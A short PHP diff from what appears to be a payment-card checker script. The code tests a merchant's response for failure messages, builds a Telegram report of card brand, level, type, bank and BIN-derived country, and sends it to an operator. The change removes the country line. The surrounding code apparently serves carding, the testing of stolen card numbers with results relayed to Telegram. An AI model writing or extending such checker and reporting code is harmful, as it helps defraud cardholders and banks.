@@ -737,7 +737,6 @@ if (strpos($Fim, 'We’re sorry. We’re unable to complete') || strpos($Fim, 'L
     $texto_telegram .= "┉┉┉┉┉┉ • ┉┉┉┉┉┉\n";
     $texto_telegram .= "⼥| Info: $brand - $nivel - $tipo\n";
     $texto_telegram .= "⼥| Bank: $bank_name\n";
-    $texto_telegram .= "⼥| Country: $bin_info\n"; // Aquí mandamos la info completa de la API
     
     enviarTelegram($texto_telegram); 
     // --------------------------------------------
